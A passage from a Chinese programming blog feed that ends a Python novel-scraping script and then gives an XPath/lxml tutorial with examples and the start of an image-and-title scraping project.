class="hljs-string">f&quot;目录:&#x27;<span class="hljs-subst">&#123;directory_path&#125;</span>&#x27;已经创建！&quot;</span>)<br>    <span class="hljs-comment">#将刚刚获取到的小说内容写进去</span><br>    write_flag = <span class="hljs-literal">True</span><br>    name_path = os.path.join(directory_path,<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;name&#125;</span>.txt&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;正在爬取：<span class="hljs-subst">&#123;name&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name_path,<span class="hljs-string">&#x27;a+&#x27;</span>,encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>        <span class="hljs-keyword">for</span> each <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-keyword">if</span> each == <span class="hljs-string">&#x27;h&#x27;</span>:<br>                write_flag = <span class="hljs-literal">False</span><br>            <span class="hljs-keyword">if</span> write_flag == <span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> each != <span class="hljs-string">&#x27;&#x27;</span>:<br>                file.write(each)<br>                <br>        file.write(<span class="hljs-string">&#x27;\n\n&#x27;</span>)<br>    <br><br><br>response = requests.get(url,headers=headers)<br>response.encoding = <span class="hljs-string">&#x27;gbk&#x27;</span><br><span class="hljs-comment">#logging.info(response.text)</span><br>soup = BeautifulSoup(response.text,<span class="hljs-string">&quot;lxml&quot;</span>)<br>chapters = soup.findAll(<span class="hljs-string">&#x27;div&#x27;</span>,class_=<span class="hljs-string">&#x27;listmain&#x27;</span>)<br><span class="hljs-comment">#logging.info(chapters)</span><br>download_soup = BeautifulSoup(<span class="hljs-built_in">str</span>(chapters),<span class="hljs-string">&#x27;lxml&#x27;</span>)<br><span class="hljs-comment">#logging.info(download_soup.contents)</span><br><span class="hljs-comment">#获取dt标签 然后获取小说名字</span><br>novel_name = <span class="hljs-built_in">str</span>(download_soup.dl.dt).split(<span class="hljs-string">&quot;》&quot;</span>)[<span class="hljs-number">0</span>][<span class="hljs-number">5</span>:]<br><span class="hljs-comment">#print(str(novel_name).split(&quot;》&quot;)[0][5:])</span><br><span class="hljs-comment">#《元尊》正文卷</span><br>flag_name = <span class="hljs-string">&quot;《&quot;</span>+novel_name+<span class="hljs-string">&quot;》&quot;</span>+<span class="hljs-string">&quot;正文卷&quot;</span><br><span class="hljs-comment">#logging.info(flag_name)</span><br><br><span class="hljs-comment">#定义存储章节链接和名字的列表</span><br>url_list = []<br>name_list = []<br><span class="hljs-comment">#需要过滤掉最新章节的内容才开始爬取，避免重复爬取</span><br>begin_flag = <span class="hljs-literal">False</span><br><span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> download_soup.dl.children:<br>    <span class="hljs-keyword">if</span> child != <span class="hljs-string">&#x27;\n&#x27;</span>:<br>        <span class="hljs-keyword">if</span> child.string == <span class="hljs-string">u&quot;%s&quot;</span> % flag_name:<br>            begin_flag = <span class="hljs-literal">True</span><br>        <span class="hljs-keyword">if</span> begin_flag == <span class="hljs-literal">True</span> <span class="hljs-keyword">and</span> child.a != <span class="hljs-literal">None</span>:<br>            download_url = <span class="hljs-string">&quot;https://www.biqukan8.cc&quot;</span>+child.a.get(<span class="hljs-string">&quot;href&quot;</span>)<br>            download_name = child.a.string <br>            <span class="hljs-comment"># print(download_url)</span><br>            <span class="hljs-comment"># print(download_name)</span><br>            url_list.append(download_url)<br>            name_list.append(download_name)<br><br><span class="hljs-comment">#用zip函数把两个列表合并起来</span><br>combined_list = <span class="hljs-built_in">zip</span>(url_list,name_list)<br><span class="hljs-keyword">for</span> item1,item2 <span class="hljs-keyword">in</span> combined_list:<br>    novel_content(item1,item2)<br></code></pre></td></tr></table></figure><img src="/img/image-20231119213400492.png" alt="image-20231119213400492" style="zoom:80%;" /> <img src="/img/image-20231119213420651.png" alt="image-20231119213420651" style="zoom:80%;" /> <p><strong>待优化：</strong></p><p>1.章节内容存在空格，需要做换行处理</p><p>2.把所有章节存到一个txt文件中，进行分章节的处理</p>]]></content>
    
    
    <categories>
      
      <category>python</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>xpath学习</title>
    <link href="/2023/11/27/xpath%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/11/27/xpath%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h1 id="Xpath学习"><a href="#Xpath学习" class="headerlink" title="Xpath学习"></a>Xpath学习</h1><h2 id="xpath介绍"><a href="#xpath介绍" class="headerlink" title="xpath介绍"></a>xpath介绍</h2><p>xpath解析原理：</p><p>1.实例化一个etree对象，将需要被解析的页面源码加载到该对象中</p><p>2.调用etree对象中的xpath方法结合xpath解析式进行标签的定位和内容的获取</p><p>环境安装：pip install lxml</p><p>Element对象：</p><p>xml结构（包括html）文档的重要部分，表示文档中的标签元素，并且提供了一些方式来进行访问和操作这些元素，包括：</p><p>1.元素名<br>2.元素属性<br>3.父子元素<br>4.文本内容<br>5.操作方法</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br>text = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">&lt;div&gt;</span><br><span class="hljs-string">        &lt;ul&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;1-item&lt;/a&gt;&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link2.html&quot;&gt;2-item&lt;/a&gt;&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link3.html&quot;&gt;3-item&lt;/a&gt;&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link4.html&quot;&gt;4-item&lt;/a&gt;&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;item-1&quot;&gt;&lt;a href=&quot;link5.html&quot;&gt;5-item&lt;/a&gt;&lt;/li&gt;</span><br><span class="hljs-string">            &lt;li class=&quot;item-0&quot;&gt;&lt;a href=&quot;link6.html&quot;&gt;6-item&lt;/a&gt;&lt;/li&gt;</span><br><span class="hljs-string">        &lt;/ul&gt;</span><br><span class="hljs-string">    &lt;/div&gt;</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-comment"># 1.使用etree.HTML 方法将html文本解析为element对象</span><br>html = etree.HTML(text) <br><span class="hljs-comment"># 2.使用etree.toString()方法可以将element对象转换为html文本</span><br>result = etree.tostring(html)<br><span class="hljs-built_in">print</span>(result.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a.html&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>) <span class="hljs-keyword">as</span> file:<br>    file.write(text)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231027113309001.png" alt="image-20231027113309001"> </p><p>**etree.HTMLParser()**：html解析器对象，常用参数如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">remove_commnets</span><span class="hljs-params">(默认是false)</span></span>：移除html文档中的注释<br><span class="hljs-function"><span class="hljs-title">remove_blank_text</span><span class="hljs-params">(默认是false)</span></span>:移除html文档中空白文本节点<br><span class="hljs-function"><span class="hljs-title">recover</span><span class="hljs-params">(默认是false)</span></span>：尝试修复损坏的html文档<br><span class="hljs-function"><span class="hljs-title">encoding</span><span class="hljs-params">(默认是None)</span></span>:指定html的编码方式<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> html<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><br><br><span class="hljs-comment">#创建一个自定义的html解析器</span><br>parser = etree.HTMLParser(remove_comments=<span class="hljs-literal">True</span>,remove_blank_text=<span class="hljs-literal">True</span>,recover=<span class="hljs-literal">True</span>)<br><br>html = etree.parse(<span class="hljs-string">&#x27;a.html&#x27;</span>,parser)<br>result = etree.tostring(html)<br><span class="hljs-built_in">print</span>(result.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231027114613555.png" alt="image-20231027114613555"></p><p>自动去除注释和修复</p><p><img src="/img/image-20231027114627062.png" alt="image-20231027114627062"></p><h2 id="xpath使用"><a href="#xpath使用" class="headerlink" title="xpath使用"></a>xpath使用</h2><p>a.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- d4a6sd4as56d13das1d7a3 --&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">div</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">ul</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item-0&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;link1.html&quot;</span>&gt;</span>1-item<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item-1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;link2.html&quot;</span>&gt;</span>2-item<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item-0&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;link3.html&quot;</span>&gt;</span>3-item<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item-1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;link4.html&quot;</span>&gt;</span>4-item<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item-1&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;link5.html&quot;</span>&gt;</span>5-item<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">li</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;item-0&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;link6.html&quot;</span>&gt;</span>6-item<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">li</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">ul</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><br></code></pre></td></tr></table></figure><p>首先将网页转换为element对象</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#将网页转换为element对象</span><br>html = etree.parse(<span class="hljs-string">&#x27;a.html&#x27;</span>,etree.HTMLParser())<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#使用xpath查询 &#x27;//*&#x27;标识选取所有的节点，无论类型和名称</span><br>result = html.xpath(<span class="hljs-string">&#x27;//*&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br>结果：<br>[&lt;Element html at <span class="hljs-number">0x2a97b4dbb00</span>&gt;, &lt;Element body at <span class="hljs-number">0x2a97b4dba80</span>&gt;, &lt;Element div at <span class="hljs-number">0x2a97b4dbb40</span>&gt;, &lt;Element ul at <span class="hljs-number">0x2a97b4dbb80</span>&gt;, &lt;Element li at <span class="hljs-number">0x2a97b4dbbc0</span>&gt;, &lt;Element a at <span class="hljs-number">0x2a97b4dbc40</span>&gt;, &lt;Element li at <span class="hljs-number">0x2a97b4dbc80</span>&gt;, &lt;Element a at <span class="hljs-number">0x2a97b4dbcc0</span>&gt;, &lt;Element li at <span class="hljs-number">0x2a97b4dbd00</span>&gt;, &lt;Element a at <span class="hljs-number">0x2a97b4dbc00</span>&gt;, &lt;Element li at <span class="hljs-number">0x2a97b4dbd40</span>&gt;, &lt;Element a at <span class="hljs-number">0x2a97b4dbd80</span>&gt;, &lt;Element li at <span class="hljs-number">0x2a97b4dbdc0</span>&gt;, &lt;Element a at <span class="hljs-number">0x2a97b4dbe00</span>&gt;, &lt;Element li at <span class="hljs-number">0x2a97b4dbe40</span>&gt;, &lt;Element a at <span class="hljs-number">0x2a97b4dbe80</span>&gt;]<br><br><span class="hljs-comment">#查询li标签</span><br>result = html.xpath(<span class="hljs-string">&#x27;//li&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br>结果：<br>[&lt;Element li at <span class="hljs-number">0x2230f19ba40</span>&gt;, &lt;Element li at <span class="hljs-number">0x2230f19bb00</span>&gt;, &lt;Element li at <span class="hljs-number">0x2230f19bb40</span>&gt;, &lt;Element li at <span class="hljs-number">0x2230f19bb80</span>&gt;, &lt;Element li at <span class="hljs-number">0x2230f19bbc0</span>&gt;, &lt;Element li at <span class="hljs-number">0x2230f19bc40</span>&gt;]<br><br><span class="hljs-comment">#通过/或者//查找子节点or子孙节点</span><br><span class="hljs-comment">#选取所有位于li标签内的a标签</span><br><span class="hljs-comment">#//li/a （li标签内的a标签）子标签</span><br><span class="hljs-comment">#获取所有的子孙节点//</span><br>result = html.xpath(<span class="hljs-string">&quot;//li/a&quot;</span>)<br><span class="hljs-built_in">print</span>(result)<br>结果：<br>[&lt;Element a at <span class="hljs-number">0x2bfad419b40</span>&gt;, &lt;Element a at <span class="hljs-number">0x2bfad419c00</span>&gt;, &lt;Element a at <span class="hljs-number">0x2bfad419c40</span>&gt;, &lt;Element a at <span class="hljs-number">0x2bfad419c80</span>&gt;, &lt;Element a at <span class="hljs-number">0x2bfad419cc0</span>&gt;, &lt;Element a at <span class="hljs-number">0x2bfad419d40</span>&gt;]<br><br><span class="hljs-comment"># //element[@attribute=&#x27;value&#x27;]</span><br><span class="hljs-comment"># //表示从文档的根开始搜索</span><br><span class="hljs-comment"># element要选择元素的名称</span><br><span class="hljs-comment"># @attribute 要筛选的属性名称</span><br><span class="hljs-comment"># value 要匹配的属性的值</span><br>result = html.xpath(<span class="hljs-string">&quot;//li[@class=&#x27;item-0&#x27;]&quot;</span>)<br><span class="hljs-built_in">print</span>(result)<br>结果：<br>[&lt;Element li at <span class="hljs-number">0x296ed746c80</span>&gt;, &lt;Element li at <span class="hljs-number">0x296ed746cc0</span>&gt;, &lt;Element li at <span class="hljs-number">0x296ed746d00</span>&gt;]<br><br><span class="hljs-comment">#父节点：..来实现</span><br>result = html.xpath(<span class="hljs-string">&#x27;//a[@href=&quot;link6.html&quot;]/../@class&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br>result = html.xpath(<span class="hljs-string">&#x27;//a[@href=&quot;link6.html&quot;]/parent::*/@class&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br>结果：<br>[<span class="hljs-string">&#x27;item-0&#x27;</span>]<br><br><span class="hljs-comment">#文本获取 text()</span><br>result = html.xpath(<span class="hljs-string">&quot;//li[@class=&#x27;item-1&#x27;]/a/text()&quot;</span>)<br><span class="hljs-built_in">print</span>(result)<br>结果：<br>[<span class="hljs-string">&#x27;2-item&#x27;</span>, <span class="hljs-string">&#x27;4-item&#x27;</span>, <span class="hljs-string">&#x27;5-item&#x27;</span>]<br><br><span class="hljs-comment">#匹配属性的内容</span><br>result = html.xpath(<span class="hljs-string">&quot;//li/a/@href&quot;</span>)<br><span class="hljs-built_in">print</span>(result)<br>结果：<br>[<span class="hljs-string">&#x27;link1.html&#x27;</span>, <span class="hljs-string">&#x27;link2.html&#x27;</span>, <span class="hljs-string">&#x27;link3.html&#x27;</span>, <span class="hljs-string">&#x27;link4.html&#x27;</span>, <span class="hljs-string">&#x27;link5.html&#x27;</span>, <span class="hljs-string">&#x27;link6.html&#x27;</span>]<br><br><br><span class="hljs-comment">#属性获取：</span><br><span class="hljs-comment">#有些节点，有多个属性，有些属性多个值  使用contains</span><br>text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;li class=&quot;li item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;1-item&lt;/a&gt;&lt;/li&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>html = etree.HTML(text)<br>result = html.xpath(<span class="hljs-string">&#x27;//li[contains(@class,li)]/a/text()&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br>结果：<br>[<span class="hljs-string">&#x27;1-item&#x27;</span>]<br><br><br><span class="hljs-comment">#属性获取：</span><br><span class="hljs-comment">#有些节点，有多个属性，有些属性多个值</span><br>text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    &lt;li class=&quot;li item-0&quot; name=&quot;r1cky&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;1-item&lt;/a&gt;&lt;/li&gt;</span><br><span class="hljs-string">    &lt;li class=&quot;li item-0&quot;&gt;&lt;a href=&quot;link1.html&quot;&gt;2-item&lt;/a&gt;&lt;/li&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>html = etree.HTML(text)<br>result = html.xpath(<span class="hljs-string">&#x27;//li[contains(@class,li) and @name=&quot;r1cky&quot;]/a/text()&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br>结果：<br>[<span class="hljs-string">&#x27;1-item&#x27;</span>]<br><br>xpath节点的运算符<br>= ：判断两个值是否相等<br>！= <br>&lt;<br>&gt;<br>&gt;=<br>&lt;=<br>逻辑运算符<br><span class="hljs-keyword">and</span><br><span class="hljs-keyword">or</span><br><span class="hljs-keyword">not</span><br>字符串运算符：<br>concat():将多个字符串连接<br>starts-<span class="hljs-keyword">with</span>():检查字符串是否以指定的前缀开头<br>contains():检查是否包含某个字符串<br>substring():从字符串截取子字符串<br>数字运算符：<br>+<br>-<br>*<br>/<br>%<br><br>按顺序选择<br>在标签中使用[]标识位置<br>last()最后一个<br>position()查询指定为位置的前几位<br><br><span class="hljs-comment">#只要第一个li节点里的a元素的文本 使用[]  从1开始</span><br>result = html.xpath(<span class="hljs-string">&#x27;//li[1]/a/text()&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#只要最后个li节点里的a元素的文本 使用[last()] </span><br>result = html.xpath(<span class="hljs-string">&#x27;//li[last()]/a/text()&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#查询前两个元素下的a标签的文本</span><br>result = html.xpath(<span class="hljs-string">&#x27;//li[position()&lt;3]/a/text()&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br><span class="hljs-comment">#查询倒数第3个</span><br>result = html.xpath(<span class="hljs-string">&#x27;//li[last()-2]/a/text()&#x27;</span>)<br><span class="hljs-built_in">print</span>(result)<br>结果：<br>[<span class="hljs-string">&#x27;1-item&#x27;</span>]<br>[<span class="hljs-string">&#x27;6-item&#x27;</span>]<br>[<span class="hljs-string">&#x27;1-item&#x27;</span>, <span class="hljs-string">&#x27;2-item&#x27;</span>]<br>[<span class="hljs-string">&#x27;4-item&#x27;</span>]<br></code></pre></td></tr></table></figure><p>小练习</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-keyword">import</span> html<br><span class="hljs-keyword">from</span> lxml <span class="hljs-keyword">import</span> etree<br><br>text = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">&lt;html&gt;</span><br><span class="hljs-string">    &lt;body&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;item&quot; id=&quot;item1&quot;&gt;item 1&lt;/div&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;item&quot; id=&quot;item2&quot;&gt;item 2&lt;/div&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;item&quot; id=&quot;item3&quot;&gt;item 3&lt;/div&gt;</span><br><span class="hljs-string">        &lt;div class=&quot;price&quot;&gt;price:$50&lt;/div&gt;</span><br><span class="hljs-string">    &lt;/body&gt;</span><br><span class="hljs-string">&lt;/html&gt;</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>tree = etree.HTML(text)<br>xpth_exp = <span class="hljs-string">&#x27;//div[contains(@class,&quot;item&quot;) or contains(@price,&quot;item&quot;)]/text()&#x27;</span><br>result = tree.xpath(xpth_exp)<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment">#查询价格大于40的div内容</span><br>xpth_exp = <span class="hljs-string">&#x27;//div[contains(text(),&quot;$&quot;) and number(substring-after(text(),&quot;$&quot;))&gt; 40]/text() &#x27;</span><br>result = tree.xpath(xpth_exp)<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment">#查询第二个div元素的内容</span><br>xpth_exp = <span class="hljs-string">&#x27;//div[position()=2]/text()&#x27;</span><br>result = tree.xpath(xpth_exp)<br><span class="hljs-built_in">print</span>(result)<br><br><span class="hljs-comment">#查询第1个和最后一个div元素的内容</span><br>xpth_exp = <span class="hljs-string">&#x27;//div[position()=1]/text() | //div[position()=last()]/text()&#x27;</span><br>result = tree.xpath(xpth_exp)<br><span class="hljs-built_in">print</span>(result)<br><br>结果：<br>[<span class="hljs-string">&#x27;item 1&#x27;</span>, <span class="hljs-string">&#x27;item 2&#x27;</span>, <span class="hljs-string">&#x27;item 3&#x27;</span>]<br>[<span class="hljs-string">&#x27;price:$50&#x27;</span>]<br>[<span class="hljs-string">&#x27;item 2&#x27;</span>]<br>[<span class="hljs-string">&#x27;item 1&#x27;</span>, <span class="hljs-string">&#x27;price:$50&#x27;</span>]<br></code></pre></td></tr></table></figure><h2 id="xpath项目"><a href="#xpath项目" class="headerlink" title="xpath项目"></a>xpath项目</h2><p>目标：<a href="https://www.4399dmw.com/search/dh-1-0-0-0-0-0-0/">https://www.4399dmw.com/search/dh-1-0-0-0-0-0-0/</a></p><p><img src="/img/image-20231027161328409.png" alt="image-20231027161328409"></p><h3 id="需求"><a href="#需求" class="headerlink" title="需求"></a>需求</h3><p>1.抓取图片和名称</p><p>2.抓取到图片和名称之后，保存到本地</p><p>3.从本地发送到远程服务器</p><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><ul><li>抓取图片xpath分析</li></ul><p><img src="/img/image-20231027163832348.png" alt="image-20231027163832348"> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">result = html.xpath(<span class="hljs-string">&#x27;//div[@class=&quot;lst&quot;]/a[@class=&quot;u-card&quot;]/img/@data-src&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231027164114062.png" alt="image-20231027164114062"></p><ul><li>抓取标题xpath</li></ul><p><img src="/img/image-20231027164655892.png" alt="image-20231027164655892"> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">result = html.xpath(<span class="hljs-string">&#x27;//div[@class=&quot;lst&quot;]/a[@class=&quot;u-card&quot;]/div[@class=&quot;u-ct&quot;]/p[@class=&quot;u-tt&quot;]/text()&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/image-20231027164736772.png" alt="image-20231027164736772"></p><ul><li>配置参数：</li></ul><p>随机UA</p><p>headers（UA,cookie,Referer）</p><p>代理，免费代理网站：<a 